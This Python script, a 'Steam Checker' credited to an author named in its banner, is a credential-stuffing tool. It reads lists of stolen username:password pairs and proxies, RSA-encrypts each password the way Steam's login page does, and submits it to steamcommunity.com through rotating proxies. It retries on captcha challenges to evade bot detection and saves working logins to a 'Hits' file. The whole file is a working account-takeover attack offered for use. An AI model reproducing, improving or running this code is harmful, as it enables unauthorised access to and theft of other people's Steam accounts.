import base64
import os
import cloudscraper
import requests
import rsa
from urllib.parse import quote
from time import time
from time import sleep
import random
from threading import Thread
from colorama import Fore, init
import datetime


init(convert=True)
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
white = Fore.WHITE
cyan = Fore.CYAN
lw = Fore.LIGHTWHITE_EX
black = Fore.BLACK
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
lc = Fore.LIGHTCYAN_EX
lib = Fore.LIGHTBLACK_EX
res = Fore.RESET
current_combo = []
errors = []
good_proxies = []
proxies = []
captured_combos = []
bad_accounts = []
bots_detection = []
total_combos = []
date = str(datetime.datetime.now()).split(' ')[0].strip()
loop = False


def write_records(hit: bool, bad: bool, combo_to_record: str):
    try:
        user = combo_to_record.split(':')[0]
        passwd = combo_to_record.split(':')[1]
        buff = f'''
        ========================================
        |             [Owner Info]             |
        ========================================
        |Name: Sabah                           |
        |Instagram: Apkaless                   |
        |Github: https://github.com/apkaless   |
        ========================================
        |             [Combo Info]             |
        ========================================
        |User: {user}                          |
        |Password: {passwd}                    |
        ========================================
        '''
        os.chdir(f'Results/{date}')
        if hit:
            with open('Hits.txt', 'a', encoding='utf8', errors='ignore') as f:
                f.write(f'{buff}\n')
                f.close()
            os.chdir(LOCAL_LOCATION)
        elif bad:
            with open('Bad.txt', 'a', encoding='utf8', errors='ignore') as f:
                f.write(f'{buff}\n')
                f.close()
            os.chdir(LOCAL_LOCATION)
    except Exception as e:
        os.chdir(LOCAL_LOCATION)
        error = str(e)
        with open('ErrorsLog.txt', 'a') as f:
            f.write(f"{error}\n")
            f.close()
    finally:
        os.chdir(LOCAL_LOCATION)



def diaplay_intro():
    print(rf'''{lb}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
                           __| __ __| __|    \     \  |     __|  |  |  __|   __|  |  /  __|  _ \ 
                         \__ \    |   _|    _ \   |\/ |    (     __ |  _|   (     . <   _|     / 
                         ____/   _|  ___| _/  _\ _|  _|   \___| _| _| ___| \___| _|\_\ ___| _|_\ 
                                                                                                 

 
                                                                                                                                                            

                                        {lb}[+] {white}Name        : {lib}Steam Checker
                                        {lb}[+] {white}Instagram   : {lib}Apkaless
                                        {lb}[+] {white}Github      :{lib} https://github.com/Apkalesss{lb}                                                                          [+] {white}Nationality : {lib}IRAQ


''')


def display_info(captures: int, deads: int, errors: int, total: int, bot, remain: int):
    os.system('cls')
    print(rf'''{lb}
    

                           __| __ __| __|    \     \  |     __|  |  |  __|   __|  |  /  __|  _ \ 
                         \__ \    |   _|    _ \   |\/ |    (     __ |  _|   (     . <   _|     / 
                         ____/   _|  ___| _/  _\ _|  _|   \___| _| _| ___| \___| _|\_\ ___| _|_\ 
                                                                                                 

{lb}========================================================================================================================

                                            {lw}[!] Total Accounts: [{cyan}{str(total).strip()}{lw}]
                                            {green}[+] Hit           : [{cyan}{str(captures).strip()}{green}]
                                            {red}[-] Bad           : [{cyan}{str(deads).strip()}{red}]
                                            {red}[-] Bot Detection : [{cyan}{bot}{red}]
                                            {lr}[-] Errors        : [{cyan}{str(errors).strip()}{lr}]
                                            {lw}[!] Remaining     : [{cyan}{str(remain).strip()}{lw}]

{lb}========================================================================================================================

''')


def get_random():
    letters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    ran_letters = random.choices(letters, k=8)
    return ''.join(ran_letters).upper()


def set_proxy_to_dict(ip_port):
    return {'http': f'http://{ip_port}', 'https': f'http://{ip_port}'}


def checker(comboList, proxies_list):
    global errors, rem
    for i in proxies_list:
        proxies.append(i)
    s = cloudscraper.create_scraper(debug=False)

    for combo in comboList:
        while True:
            if combo in total_combos:
                break

            if len(current_combo) > 0:
                combo = current_combo[0]
                user = combo.split(':')[0]
                password = combo.split(':')[1].encode()
                current_combo.clear()
            else:
                combo = combo.strip()
                user = combo.split(':')[0]
                password = combo.split(':')[1].encode()

            if len(good_proxies) > 0:
                proxy = good_proxies[0]
                proxy2 = set_proxy_to_dict(proxy.strip())
                good_proxies.clear()
            else:
                proxy = random.choice(proxies)
                proxy2 = set_proxy_to_dict(proxy.strip())
                proxies.pop(0)

            if len(current_combo) == 1:

                current_combo.clear()

            else:
                pass

            header_1 = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://steamcommunity.com",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-us",
            }

            try:
                get_pubkey = s.get(
                    f'https://steamcommunity.com/login/getrsakey?donotcache={int(time())}&username={user}',
                    headers=header_1, proxies=proxy2, timeout=10)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ReadTimeout):
                current_combo.clear()
                current_combo.append(combo)
                errors.append(proxy)
                continue
            good_proxies.append(proxy)
            try:
                pub_key_js = get_pubkey.json()
                publickey_mod = pub_key_js['publickey_mod']
                publickey_exp = pub_key_js['publickey_exp']
                timestamp = pub_key_js['timestamp']
            except Exception as e:
                error = str(e)
                with open('ErrorsLog.txt', 'a') as f:
                    f.write(f"{error}\n")
                    f.close()

            encpass = quote(
                base64.b64encode(rsa.encrypt(password, rsa.PublicKey(int(publickey_mod, 16), int(publickey_exp, 16)))))
            data_2 = f"donotcache={int(time())}&password={encpass}&username={user}&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={timestamp}&remember_login=false&oauth_client_id={get_random()}"
            login_url = 'https://steamcommunity.com/login/dologin/'
            header_2 = {
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://steamcommunity.com",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                "Referer": "https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-us",
            }
            try:
                response = s.post(login_url, data=data_2, headers=header_2, proxies=proxy2, timeout=10)
            except (requests.exceptions.ProxyError, requests.exceptions.ReadTimeout) as e:
                error = str(e)
                with open('ErrorsLog.txt', 'a') as f:
                    f.write(f"{error}\n")
                    f.close()
                current_combo.clear()
                current_combo.append(combo)
                errors.append(proxy)
                continue
            try:
                jsdata = response.json()
            except Exception as e:
                error = str(e)
                with open('ErrorsLog.txt', 'a') as f:
                    f.write(f"{error}\n")
                    f.close()

            try:

                if '"The account name or password that you have entered is incorrect."' in response.text:
                    if combo in total_combos:
                        current_combo.clear()
                        good_proxies.append(proxy)
                        break
                    bad_accounts.append(combo)
                    rem -= 1
                    current_combo.clear()
                    good_proxies.append(proxy)
                    total_combos.append(combo)
                    write_records(hit=False, bad=True, combo_to_record=combo)
                    try:
                        comboList.remove(combo)
                    except Exception as e:
                        error = str(e)
                        with open('ErrorsLog.txt', 'a') as f:
                            f.write(f"{error}\n")
                            f.close()

                    loop = False

                elif '"Please verify your humanity by re-entering the characters in the captcha."' in response.text:
                    current_combo.clear()
                    current_combo.append(combo)
                    bots_detection.append(proxy)
                    loop = True

                elif jsdata['success'] == True:
                    if combo in total_combos:
                        current_combo.clear()
                        good_proxies.append(proxy)
                        break

                    captured_combos.append(combo)
                    total_combos.append(combo)
                    comboList.remove(combo)
                    current_combo.clear()
                    rem -= 1
                    loop = False
                    write_records(hit=True, bad=False, combo_to_record=combo)
                else:
                    bad_accounts.append(combo)
                    rem -= 1
                    break
            except Exception as e:
                error = str(e)
                with open('ErrorsLog.txt', 'a') as f:
                    f.write(f"{error}\n")
                    f.close()
                loop = True
                try:
                    current_combo.clear()
                    current_combo.append(combo)
                    good_proxies.clear()
                    errors.append(proxy)
                except Exception as e:
                    error = str(e)
                    with open('ErrorsLog.txt', 'a') as f:
                        f.write(f"{error}\n")
                        f.close()

                continue
            sleep(3)

            if loop == True:
                continue
            elif loop == False:
                break


if __name__ == '__main__':
    LOCAL_LOCATION = os.getcwd()
    os.makedirs(f'Results/{date}', exist_ok=True)
    while True:

        diaplay_intro()
        combolist = input(f'{white}[!] {lib}Please Insert Your Combo List >>>>>{lb} ')
        proxies_file = input(f'\n{white}[!] {lib}Please Insert Your Proxy List >>>>>{lb} ')

        if combolist and proxies_file:
            break
        else:
            os.system('cls')
            continue

    with open(combolist, 'r', encoding='utf8', errors='ignore') as f:
        comboslist = f.read().splitlines()
        total = len(comboslist)
        rem = len(comboslist)
    with open(proxies_file, 'r') as f:
        proxies_file = f.read().splitlines()

    threads = []
    try:

        while True:

                display_info(len(captured_combos), len(bad_accounts), len(errors), total, len(bots_detection), rem)

                for i in range(1):
                    try:

                        th = Thread(target=checker, args=(comboslist, proxies_file))
                        th.start()
                        threads.append(th)
                        sleep(0.07)
                    except Exception as e:
                        error = str(e)
                        with open('ErrorsLog.txt', 'a') as f:
                            f.write(f"{error}\n")
                            f.close()

                sleep(0.2)
    except KeyboardInterrupt:
        os.system('cls')
        print('\n[!] Visit My Github: https://github.com/apkaless\n\n[!] Add Me On Instagram: Apkaless\n')
        sleep(2)
        exit(0)